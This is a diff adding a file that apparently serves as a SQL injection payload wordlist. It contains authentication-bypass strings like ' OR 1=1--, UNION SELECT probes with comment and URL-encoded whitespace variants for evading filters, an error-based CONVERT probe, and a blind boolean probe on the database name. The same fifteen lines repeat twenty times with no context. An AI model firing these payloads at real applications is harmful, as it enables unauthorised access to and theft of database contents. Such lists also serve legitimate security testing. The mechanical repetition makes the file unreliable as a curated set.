@@ -1,0 +1,300 @@
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
